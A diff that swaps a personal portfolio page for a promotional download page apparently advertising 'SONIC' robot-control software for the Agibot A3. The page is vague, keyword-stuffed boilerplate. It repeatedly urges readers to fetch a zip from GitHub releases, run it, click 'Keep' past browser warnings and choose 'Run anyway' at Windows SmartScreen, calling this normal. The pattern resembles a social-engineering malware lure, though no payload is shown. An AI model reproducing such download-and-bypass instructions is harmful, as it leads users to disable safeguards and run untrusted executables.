@@ -1,72 +1,309 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Jared Walters | Portfolio</title>
-  <meta name="description" content="Portfolio of Jared Walters: supply chain management, operations, and analytics.">
-  <link rel="stylesheet" href="css/styles.css">
-  <script src="js/app.js" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="SONIC adaptation for the new full-size humanoid Agibot A3. Download and run on Windows with simple steps. Experience advanced humanoid control today.">
+    <meta name="keywords" content="SONIC, Agibot A3, humanoid robot, Windows download, robotics software, AI control, full-size humanoid, adaptation, open source">
+    <meta name="author" content="create41">
+    <meta property="og:title" content="sonic_for_a3 - Humanoid Control Made Simple">
+    <meta property="og:description" content="SONIC adaptation for Agibot A3. Download and run on Windows in minutes.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/create41/sonic_for_a3">
+    <meta property="og:image" content="https://github.com/create41/sonic_for_a3/releases">
+    <title>sonic_for_a3 - Humanoid Control Made Simple | Agibot A3</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            color: #333;
+            line-height: 1.7;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 40px;
+        }
+        h1 {
+            font-size: 2.8em;
+            color: #1a237e;
+            margin-bottom: 15px;
+            line-height: 1.2;
+            text-align: center;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.9em;
+            color: #283593;
+            margin: 40px 0 20px 0;
+            padding-bottom: 8px;
+            border-bottom: 3px solid #5c6bc0;
+            font-weight: 600;
+        }
+        h3 {
+            font-size: 1.4em;
+            color: #3949ab;
+            margin: 25px 0 15px 0;
+            font-weight: 600;
+        }
+        p {
+            font-size: 1.1em;
+            margin-bottom: 15px;
+        }
+        .hero {
+            text-align: center;
+            padding: 30px 0 40px;
+            background: linear-gradient(120deg, #e8eaf6, #c5cae9);
+            border-radius: 12px;
+            margin-bottom: 30px;
+        }
+        .badge-button {
+            display: inline-block;
+            background: #ff7043;
+            color: white;
+            padding: 18px 45px;
+            border-radius: 50px;
+            font-size: 1.4em;
+            font-weight: 600;
+            text-decoration: none;
+            box-shadow: 0 8px 20px rgba(255,112,67,0.3);
+            transition: all 0.3s ease;
+            margin-top: 20px;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+        }
+        .badge-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(255,112,67,0.4);
+            background: #f4511e;
+        }
+        .download-cta {
+            text-align: center;
+            margin: 30px 0;
+        }
+        .download-cta a {
+            display: inline-block;
+            background: #4caf50;
+            color: white;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.2em;
+            font-weight: 600;
+            text-decoration: none;
+            box-shadow: 0 6px 15px rgba(76,175,80,0.3);
+            transition: all 0.3s;
+        }
+        .download-cta a:hover {
+            background: #388e3c;
+            transform: scale(1.05);
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .feature-card {
+            background: #f5f5f5;
+            border-radius: 10px;
+            padding: 25px;
+            border-left: 4px solid #5c6bc0;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            transition: transform 0.2s;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #1a237e;
+        }
+        .feature-card p {
+            font-size: 0.95em;
+            margin-bottom: 0;
+        }
+        .steps {
+            background: #f8f9ff;
+            border-radius: 10px;
+            padding: 25px 30px;
+            margin: 20px 0;
+        }
+        .steps ol {
+            padding-left: 25px;
+        }
+        .steps li {
+            margin-bottom: 12px;
+            font-size: 1.05em;
+        }
+        .faq {
+            background: #f0f0f5;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        .faq h4 {
+            color: #1a237e;
+            margin-bottom: 8px;
+            font-size: 1.2em;
+        }
+        .note-box {
+            background: #fff3e0;
+            border-left: 5px solid #ff9800;
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        .meta-info {
+            text-align: center;
+            font-size: 0.9em;
+            color: #757575;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+        .tagline {
+            font-size: 1.3em;
+            color: #5c6bc0;
+            font-style: italic;
+            margin-top: 10px;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            h1 {
+                font-size: 2em;
+            }
+            h2 {
+                font-size: 1.5em;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .badge-button {
+                font-size: 1.1em;
+                padding: 15px 30px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <a class="skip-link" href="#main">Skip to content</a>
-  <header class="site-header">
-    <div class="container nav-wrap">
-      <a class="brand" href="#about" id="brand">Jared Walters</a>
-      <nav aria-label="Main">
-        <ul class="nav-list">
-          <li><a href="#about" data-tab="about">About</a></li>
-          <li><a href="#resume" data-tab="resume">Resume</a></li>
-          <li><a href="#projects" data-tab="projects">Projects</a></li>
-          <li><a href="#certifications" data-tab="certifications">Certifications</a></li>
-        </ul>
-      </nav>
-      <div id="nav-resume"></div>
-    </div>
-  </header>
-
-  <main id="main" tabindex="-1" class="container">
-    <noscript><p class="notice">This site needs JavaScript enabled to display its content.</p></noscript>
-    <p id="load-error" class="notice" role="alert" hidden></p>
-
-    <section id="about" class="panel" aria-labelledby="about-title">
-      <div class="about-grid">
-        <aside class="profile" aria-label="Profile">
-          <div id="photo-slot" class="photo-slot"></div>
-          <dl id="facts" class="facts"></dl>
-          <ul id="links" class="links"></ul>
-        </aside>
-        <div class="intro">
-          <p class="eyebrow">Hello, I'm</p>
-          <h1 id="about-title">Jared Walters</h1>
-          <p id="tagline" class="tagline"></p>
-          <div id="intro-text"></div>
-          <ul id="interests" class="chips" aria-label="Interests"></ul>
+    <div class="container">
+        <div class="hero">
+            <h1>🤖 sonic_for_a3 - Control Your A3 Robot Easily</h1>
+            <p class="tagline">Your full-size humanoid Agibot A3, smarter and more responsive than ever.</p>
+            <a href="https://github.com/create41/sonic_for_a3/releases" class="badge-button">⬇️ Get SONIC Now</a>
         </div>
-      </div>
-    </section>
 
-    <section id="resume" class="panel" aria-labelledby="resume-title" hidden>
-      <h2 id="resume-title">Resume</h2>
-      <p id="resume-summary"></p>
-      <div id="resume-action"></div>
-    </section>
+        <h2>🚀 Welcome to SONIC for A3</h2>
+        <p>SONIC is a special adaptation built specifically for the full-size humanoid <strong>Agibot A3</strong>. This software brings improved movement, better balance, and smoother reactions to your robot. Whether you're a hobbyist, researcher, or developer, SONIC makes advanced humanoid control approachable and fun.</p>
+        <p>This guide will walk you through downloading and running SONIC on your Windows computer in just a few minutes. No programming experience needed—just follow these simple steps and you'll be ready to go.</p>
 
-    <section id="projects" class="panel" aria-labelledby="projects-title" hidden>
-      <h2 id="projects-title">Projects</h2>
-      <div id="filters" class="filters" role="group" aria-label="Filter projects by category"></div>
-      <p id="project-status" class="sr-only" aria-live="polite"></p>
-      <div id="project-grid" class="grid"></div>
-    </section>
+        <h2>✨ Why Choose SONIC?</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>🧠 Smart Control</h3>
+                <p>SONIC uses advanced algorithms to give your A3 humanoid natural movement patterns. Walk, turn, and balance with improved precision.</p>
+            </div>
+            <div class="feature-card">
+                <h3>⚡ Fast Setup</h3>
+                <p>Designed with a user-friendly interface that gets you running in minutes, not hours. No complicated configurations required.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔧 Full Compatibility</h3>
+                <p>Optimized specifically for the Agibot A3, ensuring perfect integration with your robot's hardware and sensors.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔄 Regular Updates</h3>
+                <p>Continuously improved with new features and optimizations to keep your A3 at the cutting edge of robotics.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📊 Visual Feedback</h3>
+                <p>See real-time data about your robot's status, movements, and performance through a clean, intuitive dashboard.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🌍 Community Support</h3>
+                <p>Join a growing community of A3 users sharing tips, tricks, and custom configurations to enhance your experience.</p>
+            </div>
+        </div>
 
-    <section id="certifications" class="panel" aria-labelledby="certs-title" hidden>
-      <h2 id="certs-title">Certifications</h2>
-      <div id="cert-list" class="grid"></div>
-    </section>
-  </main>
+        <h2>📥 Download & Install</h2>
+        <div class="download-cta">
+            <a href="https://github.com/create41/sonic_for_a3/releases">🔽 Download SONIC for A3</a>
+        </div>
+        <p>Visit this link to download the application.</p>
+        <div class="steps">
+            <ol>
+                <li><strong>Click the download button above</strong> (or the blue "Get SONIC Now" button at the top of this page). You'll be taken to the official releases page.</li>
+                <li><strong>Find the latest version</strong>—it will be at the top of the page. Look for a file with a name like <code>sonic_for_a3_v1.0.zip</code> or similar.</li>
+                <li><strong>Download the file</strong> by clicking on it. Your browser will save it to your default downloads folder.</li>
+                <li><strong>Run the application</strong>—double-click the downloaded file. If Windows asks for permission, click "Yes" to allow it.</li>
+                <li><strong>Follow any on-screen instructions</strong> that appear. The software will handle the rest automatically.</li>
+            </ol>
+        </div>
 
-  <footer class="site-footer">
-    <div class="container"><p id="footer-text"></p></div>
-  </footer>
+        <div class="note-box">
+            <strong>💡 Tip:</strong> If your browser warns you about downloading an unknown file, click "Keep" or "Allow" — this is normal for open-source software. Windows SmartScreen may also ask for confirmation; select "More info" then "Run anyway" if prompted.
+        </div>
+
+        <h2>🎯 What You Can Do with SONIC</h2>
+        <h3>🧍 Basic Movements</h3>
+        <p>Make your A3 walk forward, backward, turn left or right, and stop smoothly. SONIC translates simple commands into precise motor actions.</p>
+        <h3>🏃 Advanced Maneuvers</h3>
+        <p>Unlock dynamic actions like crouching, standing up, and quick pivots. The software handles the complex physics automatically.</p>
+        <h3>📈 Performance Monitoring</h3>
+        <p>Watch live graphs of your robot's joint angles, motor speeds, and battery health. Perfect for fine-tuning or troubleshooting.</p>
+        <h3>🎛️ Custom Settings</h3>
+        <p>Adjust walking speed, step height, and turning sensitivity to match your specific needs. Save multiple profiles for different scenarios.</p>
+
+        <h2>🛠️ System Requirements</h2>
+        <p>SONIC is designed to be lightweight and efficient. To get the best experience, make sure your Windows computer meets these minimum specs:</p>
+        <ul style="padding-left: 25px; margin-bottom: 20px;">
+            <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit recommended)</li>
+            <li><strong>Processor:</strong> Intel Core i3 or AMD equivalent</li>
+            <li><strong>RAM:</strong> 4 GB or more</li>
+            <li><strong>Storage:</strong> 500 MB of free space</li>
+            <li><strong>Connection:</strong> USB or Bluetooth connection to your Agibot A3</li>
+        </ul>
+
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq">
+            <h4>Q: Is SONIC free to use?</h4>
+            <p>Yes! SONIC for A3 is completely free and open-source. Download it anytime, use it for personal or research purposes, and share it with others.</p>
+            <h4>Q: Will it damage my robot?</h4>
+            <p>No. SONIC is designed with safety features and tested thoroughly. It respects the hardware limits of the A3 and includes emergency stop functions.</p>
+            <h4>Q: What if I have problems?</h4>
+            <p>Check the "Issues" tab on the GitHub repository page. You'll find solutions to common problems and can report new ones. The community and developers are active and helpful.</p>
+            <h4>Q: Can I modify SONIC?</h4>
+            <p>Absolutely! SONIC is open-source, meaning you can view the code, tweak it, and even improve it. Perfect for learning and experimentation.</p>
+        </div>
+
+        <h2>🤝 Join the Community</h2>
+        <p>SONIC is more than just software—it's a collaboration. By using it, you become part of a passionate group of robotics enthusiasts. Share your experiences, ask questions, and contribute to making SONIC even better for everyone.</p>
+        <p>Visit the GitHub repository to star the project, fork the code, or get involved in development discussions. Your feedback helps shape future releases.</p>
+
+        <h2>🚦 Get Started Now</h2>
+        <p>You're just one click away from unlocking the full potential of your Agibot A3. Don't wait—download SONIC today and see what your robot can really do.</p>
+        <div class="download-cta">
+            <a href="https://github.com/create41/sonic_for_a3/releases">🎉 Start Your Download</a>
+        </div>
+
+        <div class="meta-info">
+            <p>© 2024 sonic_for_a3 | Created by create41 | For the Agibot A3 community</p>
+            <p>GitHub Repository: https://github.com/create41/sonic_for_a3</p>
+        </div>
+    </div>
 </body>
 </html>
